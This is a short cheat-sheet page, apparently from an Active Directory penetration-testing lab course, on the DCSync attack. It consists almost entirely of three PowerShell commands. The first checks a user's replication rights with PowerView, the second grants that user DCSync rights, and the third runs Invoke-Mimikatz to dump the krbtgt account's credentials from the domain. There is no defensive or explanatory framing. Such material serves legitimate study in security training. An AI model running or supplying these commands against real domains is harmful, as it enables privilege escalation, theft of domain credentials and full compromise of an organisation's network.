---
layout: page
title: "# Invoke DCSync"
permalink: /ad_cheatsheets/invoke_dcsync
---

# Invoke DCSync

## Check if user has replication rights

```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "student648") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

## Adding rights

```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student648 -Rights DCSync -Verbose
```

## Dumping Creds

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
